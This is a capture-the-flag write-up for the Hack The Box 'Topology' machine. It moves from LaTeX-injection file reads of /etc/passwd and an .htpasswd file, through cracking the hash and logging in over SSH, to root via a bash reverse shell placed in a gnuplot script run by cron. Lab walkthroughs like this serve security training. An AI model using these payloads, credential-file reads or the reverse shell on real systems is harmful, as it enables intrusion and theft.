we hadd the ip address to /etc/hosts:

	sudo nano /etc/hosts
	10.10.11.217	topology.htb

we start by enumerate the ports:

	rustscan -a 10.10.11.217

output:

	Open 10.10.11.217:22
	Open 10.10.11.217:80

the 80 is open, so we can visti the website, in the main page there is a link to a vhost called latex.topology.htb, so we do the same process to add the subdomain at /etc/hosts:

	sudo nano /etc/hosts
	10.10.11.217	topology.htb latex.topology.htb

the main use the latex code in order to generate images, it's time to exploit it, so we can search on internet "latex RCE", and we find this github repo:

	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection

I tried some payloads but only one it works:

	$\lstinputlisting{/etc/passwd}$

we can see that there is a user called vdaisley, so we continue with the LFI.
The winning payload it was this one:

	$\lstinputlisting{/var/www/dev/.htpasswd}$

output:

	vdaisley:{REDACTED}

the password is hashed, we can use john in order to retrieve the password:

	john hash.txt -w /usr/share/wordlists/rockyou.txt

we have the credentials to connect into SSH by using pwncat:

	python3 -m pwncat
	connect ssh://vdaisley:{REDACTED}@10.10.11.217

We're in and we can retrieve the user flag.
This time instead upload and run linpeas.sh, I want use pspy64:

	pwncat> upload /home/user/Desktop/Pentest/pspy64   /tmp/pspy64 
	chmod +x pspy64
	./pspy64

output:

	/bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;

the output above is very suspicious, root execute every .plt script inside the /opt/gnuplot and the /gnuplot is world-executable and world-writable so we can enter a revshell inside a .plt script

	nano shell.plt
	system "/bin/bash -i >& /dev/tcp/10.10.16.75/5555 0>&1"

we open a listener:

	python3 -m pwncat
	connect -lp 5555

after some minutes, we recieve the revshell,we're root and we can retrieve the root.txt.


